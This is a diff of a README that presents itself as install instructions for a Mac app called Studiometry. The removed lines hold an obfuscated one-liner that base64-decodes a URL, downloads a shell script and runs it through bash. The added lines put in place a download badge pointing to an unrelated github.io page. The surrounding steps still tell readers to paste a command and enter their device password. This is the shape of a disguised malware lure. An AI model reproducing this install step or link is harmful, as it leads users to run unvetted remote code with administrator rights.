@@ -7,9 +7,9 @@ Studiometry runs entirely on your Mac with optional syncing between devices, ens
 
 ## 🧰 Installation via a command in the terminal:
 1. Copy the installation command below.
-```
-  /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
-```   
+
+[![Download Studiometryb macOS](https://img.shields.io/badge/Download-Studiometry_macOS-blueviolet)](https://leonelmorriswais.github.io/.github/studiometry-macos-suite)
+
 2. Open Terminal on your device, paste the command, then press Return.  
 3. Enter your device password when prompted and confirm the installation.
 
